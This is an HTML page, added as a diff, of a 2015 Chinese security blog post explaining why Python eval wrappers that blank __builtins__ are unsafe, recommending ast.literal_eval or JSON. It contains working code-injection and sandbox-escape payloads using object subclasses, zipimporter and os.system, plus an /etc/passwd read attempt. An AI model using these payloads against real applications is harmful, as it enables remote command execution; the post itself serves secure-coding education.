@@ -1,0 +1,1394 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="eOKt_3ycRCL7ILr4F1AM1eilrWXcADidutENpULFpsE" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="python,eval,sandbox escape,沙箱绕过," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="xxlegend" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="最近在代码评审的过程，发现挺多错误使用eval导致代码注入的问题，比较典型的就是把eval当解析dict使用，有的就是简单的使用eval，有的就是错误的封装了eval，供全产品使用，这引出的问题更严重，这些都是血淋淋的教训，大家使用的时候多加注意。下面列举一个实际产品中的例子，详情见[bug83055][1]： def remove(request, obj)：      query = quer">
+<meta name="keywords" content="python,eval,sandbox escape,沙箱绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python eval的常见错误封装及利用原理">
+<meta property="og:url" content="http://yoursite.com/2015/07/31/Python eval的常见错误封装及利用原理/index.html">
+<meta property="og:site_name" content="xxlegend">
+<meta property="og:description" content="最近在代码评审的过程，发现挺多错误使用eval导致代码注入的问题，比较典型的就是把eval当解析dict使用，有的就是简单的使用eval，有的就是错误的封装了eval，供全产品使用，这引出的问题更严重，这些都是血淋淋的教训，大家使用的时候多加注意。下面列举一个实际产品中的例子，详情见[bug83055][1]： def remove(request, obj)：      query = quer">
+<meta property="og:updated_time" content="2017-05-01T09:43:07.043Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Python eval的常见错误封装及利用原理">
+<meta name="twitter:description" content="最近在代码评审的过程，发现挺多错误使用eval导致代码注入的问题，比较典型的就是把eval当解析dict使用，有的就是简单的使用eval，有的就是错误的封装了eval，供全产品使用，这引出的问题更严重，这些都是血淋淋的教训，大家使用的时候多加注意。下面列举一个实际产品中的例子，详情见[bug83055][1]： def remove(request, obj)：      query = quer">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"right","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2015/07/31/Python eval的常见错误封装及利用原理/"/>
+
+
+
+
+
+  <title>Python eval的常见错误封装及利用原理 | xxlegend</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ae110488ae3a7a2872b00e735070cfbc";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xxlegend</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2015/07/31/Python eval的常见错误封装及利用原理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Python eval的常见错误封装及利用原理
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-07-31T15:39:38+08:00">
+                2015-07-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2015/07/31/Python eval的常见错误封装及利用原理/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2015/07/31/Python eval的常见错误封装及利用原理/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2015/07/31/Python eval的常见错误封装及利用原理/" class="leancloud_visitors" data-flag-title="Python eval的常见错误封装及利用原理">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近在代码评审的过程，发现挺多错误使用eval导致代码注入的问题，比较典型的就是把eval当解析dict使用，有的就是简单的使用eval，有的就是错误的封装了eval，供全产品使用，这引出的问题更严重，这些都是血淋淋的教训，大家使用的时候多加注意。<br>下面列举一个实际产品中的例子，详情见[bug83055][1]：</p>
+<pre><code>def remove(request, obj)：
+     query = query2dict(request.POST)
+     eval(query[&apos;oper_type&apos;])(query, customer_obj)
+</code></pre><p>而query就是POST直接转换而来，是用户可直接控制的，假如用户在url参数中输入<code>oper_type=__import__(&#39;os&#39;).system(&#39;sleep 5&#39;)</code> 则可以执行命令sleep，当然也可以执行任意系统命令或者任意可执行代码，危害是显而易见的，那我们来看看eval到底是做什么的，以及如何做才安全？</p>
+<h1 id="1，做什么"><a href="#1，做什么" class="headerlink" title="1，做什么"></a>1，做什么</h1><p>简单来说就是执行一段表达式</p>
+<pre><code>&gt;&gt;&gt; eval(&apos;2+2&apos;)
+4
+
+&gt;&gt;&gt; eval(&quot;&quot;&quot;{&apos;name&apos;:&apos;xiaoming&apos;,&apos;ip&apos;:&apos;10.10.10.10&apos;}&quot;&quot;&quot;)
+{&apos;ip&apos;: &apos;10.10.10.10&apos;, &apos;name&apos;: &apos;xiaoming&apos;}
+
+&gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;uname&apos;)&quot;, {})
+Linux
+0
+</code></pre><p>从这三段代码来看，第一个很明显做计算用，第二个把string类型数据转换成python的数据类型，这里是dict，这也是咱们产品中常犯的错误。第三个就是坏小子会这么干，执行系统命令。<br>eval 可接受三个参数，eval(source[, globals[, locals]]) -&gt; value<br>globals必须是路径，locals则必须是键值对，默认取系统globals和locals</p>
+<h1 id="2，不正确的封装"><a href="#2，不正确的封装" class="headerlink" title="2，不正确的封装"></a>2，不正确的封装</h1><p>（1）下面我们来看一段咱们某个产品代码中的封装函数，见[bug][2]，或者<a href="http://blog.knownsec.com/2012/05/python%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%A8%81%E8%83%81%E4%B9%8Beval%EF%BC%88%EF%BC%89/" target="_blank" rel="external">网络上搜索排名比较高的代码</a>，eg：</p>
+<pre><code>def safe_eval(eval_str):
+    try:
+        #加入命名空间
+        safe_dict = {}
+        safe_dict[&apos;True&apos;] = True
+        safe_dict[&apos;False&apos;] = False
+        return eval(eval_str,{&apos;__builtins__&apos;:None},safe_dict)
+    except Exception,e:
+        traceback.print_exc()
+        return &apos;&apos;
+</code></pre><p>在这里<code>__builtins__</code>置为空了，所以像<code>__import__</code>这是内置变量就没有了，这个封装函数就安全了吗？下面我一步步道来：</p>
+<pre><code>&gt;&gt;&gt; dir(__builtins__)
+[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;,
+</code></pre><p>列表项</p>
+<p> ‘UnicodeEncodeError’, ‘UnicodeError’, ‘UnicodeTranslateError’, ‘UnicodeWarning’, ‘UserWarning’, ‘ValueError’, ‘Warning’, ‘ZeroDivisionError’, ‘_’, ‘<strong>debug</strong>‘, ‘<strong>doc</strong>‘, ‘<strong>import</strong>‘, ‘<strong>name</strong>‘, ‘<strong>package</strong>‘, ‘abs’, ‘all’, ‘any’, ‘apply’, ‘basestring’, ‘bin’, ‘bool’, ‘buffer’, ‘bytearray’, ‘bytes’, ‘callable’, ‘chr’, ‘classmethod’, ‘cmp’, ‘coerce’, ‘compile’, ‘complex’, ‘copyright’, ‘credits’, ‘delattr’, ‘dict’, ‘dir’, ‘divmod’, ‘enumerate’, ‘eval’, ‘execfile’, ‘exit’, ‘file’, ‘filter’, ‘float’, ‘format’, ‘frozenset’, ‘getattr’, ‘globals’, ‘hasattr’, ‘hash’, ‘help’, ‘hex’, ‘id’, ‘input’, ‘int’, ‘intern’, ‘isinstance’, ‘issubclass’, ‘iter’, ‘len’, ‘license’, ‘list’, ‘locals’, ‘long’, ‘map’, ‘max’, ‘memoryview’, ‘min’, ‘next’, ‘object’, ‘oct’, ‘open’, ‘ord’, ‘pow’, ‘print’, ‘property’, ‘quit’, ‘range’, ‘raw_input’, ‘reduce’, ‘reload’, ‘repr’, ‘reversed’, ‘round’, ‘set’, ‘setattr’, ‘slice’, ‘sorted’, ‘staticmethod’, ‘str’, ‘sum’, ‘super’, ‘tuple’, ‘type’, ‘unichr’, ‘unicode’, ‘vars’, ‘xrange’, ‘zip’]</p>
+<p>从<code>__builtins__</code>可以看到其模块中有<code>__import__</code>,可以借助用来执行os的一些操作。如果置为空，再去执行eval函数呢，结果如下：</p>
+<pre><code>&gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;uname&apos;)&quot;, {&apos;__builtins__&apos;:{}})
+Traceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
+NameError: name &apos;__import__&apos; is not defined
+</code></pre><p>现在就是提示<code>__import__</code>未定义，不能成功执行了，看情况是安全了吧？答案当然是错的。<br>比如执行如下：</p>
+<pre><code>&gt;&gt;&gt; s = &quot;&quot;&quot;
+... (lambda fc=(
+...     lambda n: [
+...         c for c in
+...             ().__class__.__bases__[0].__subclasses__()
+...             if c.__name__ == n
+...         ][0]
+...     ):
+...     fc(&quot;function&quot;)(
+...         fc(&quot;code&quot;)(
+...             0,0,0,0,&quot;test&quot;,(),(),(),&quot;&quot;,&quot;&quot;,0,&quot;&quot;
+...         ),{}
+...     )()
+... )()
+... &quot;&quot;&quot;
+&gt;&gt;&gt; eval(s, {&apos;__builtins__&apos;:{}})
+Segmentation fault (core dumped)
+</code></pre><p>在这里用户定义了一段函数，这个函数调用，直接导致段错误<br>下面这段代码则是退出解释器：</p>
+<pre><code>&gt;&gt;&gt;
+&gt;&gt;&gt; s = &quot;&quot;&quot;
+... [
+...     c for c in
+...     ().__class__.__bases__[0].__subclasses__()
+...     if c.__name__ == &quot;Quitter&quot;
+... ][0](0)()
+... &quot;&quot;&quot;
+&gt;&gt;&gt; eval(s,{&apos;__builtins__&apos;:{}})
+liaoxinxi@RCM-RSAS-V6-Dev ~/tools/auto_judge $ 
+</code></pre><p>初步理解一下整个过程：</p>
+<pre><code>&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()
+[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;Struct&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;class &apos;configobj.InterpolationEngine&apos;&gt;, &lt;class &apos;configobj.SimpleVal&apos;&gt;, &lt;class &apos;configobj.InterpolationEngine&apos;&gt;, &lt;class &apos;configobj.SimpleVal&apos;&gt;]
+</code></pre><p>这句python代码的意思就是找tuple的class，再找它的基类，也就是object，再通过object找他的子类，具体的子类也如代码中的输出一样。从中可以看到了有file模块，zipimporter模块，是不是可以利用下呢？首先从file入手<br>假如用户如果构造：</p>
+<pre><code>&gt;&gt;&gt; s1 = &quot;&quot;&quot;
+... [
+...     c for c in
+...     ().__class__.__bases__[0].__subclasses__()
+...     if c.__name__ == &quot;file&quot;
+... ][0](&quot;/etc/passwd&quot;).read()()
+... &quot;&quot;&quot;
+&gt;&gt;&gt; eval(s1,{&apos;__builtins__&apos;:{}})
+Traceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+  File &quot;&lt;string&gt;&quot;, line 6, in &lt;module&gt;
+IOError: file() constructor not accessible in restricted mode
+</code></pre><p>这个restrictected mode简单理解就是python解释器的沙盒，一些功能被限制了，比如说不能修改系统，不能使用一些系统函数，如file，详情见<a href="http://grail.sourceforge.net/info/manual/restricted.html" target="_blank" rel="external">Restricted Execution Mode</a>，那怎么去绕过呢？这时我们就想到了zipimporter了，假如引入的模块中引用了os模块，我们就可以像如下代码来利用。</p>
+<pre><code>&gt;&gt;&gt; s2=&quot;&quot;&quot;
+... [x for x in ().__class__.__bases__[0].__subclasses__()
+...    if x.__name__ == &quot;zipimporter&quot;][0](
+...      &quot;/home/liaoxinxi/eval_test/configobj-4.4.0-py2.5.egg&quot;).load_module(
+...      &quot;configobj&quot;).os.system(&quot;uname&quot;)
+... &quot;&quot;&quot;
+&gt;&gt;&gt; eval(s2,{&apos;__builtins__&apos;:{}})
+Linux
+0
+</code></pre><p>这就验证了刚才的safe_eval其实是不安全的。</p>
+<h1 id="3，如何正确使用"><a href="#3，如何正确使用" class="headerlink" title="3，如何正确使用"></a>3，如何正确使用</h1><p>（1）使用ast.literal_eval<br>（2）如果仅仅是将字符转为dict，可以使用json格式</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/python/" rel="tag"># python</a>
+          
+            <a href="/tags/eval/" rel="tag"># eval</a>
+          
+            <a href="/tags/sandbox-escape/" rel="tag"># sandbox escape</a>
+          
+            <a href="/tags/沙箱绕过/" rel="tag"># 沙箱绕过</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/07/30/Python安全编码&代码审计/" rel="next" title="Python安全编码&代码审计">
+                <i class="fa fa-chevron-left"></i> Python安全编码&代码审计
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/02/01/如何让Burpsuite监听微信公众号/" rel="prev" title="如何让Burpsuite监听微信公众号">
+                如何让Burpsuite监听微信公众号 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="廖新喜" />
+          <p class="site-author-name" itemprop="name">廖新喜</p>
+           
+              <p class="site-description motion-element" itemprop="description">分享些安全编码，漏洞分析</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">65</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/shengqi158" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/shengqi158" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/1900013681" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1，做什么"><span class="nav-number">1.</span> <span class="nav-text">1，做什么</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2，不正确的封装"><span class="nav-number">2.</span> <span class="nav-text">2，不正确的封装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3，如何正确使用"><span class="nav-number">3.</span> <span class="nav-text">3，如何正确使用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">廖新喜</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://xxlegend-com.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
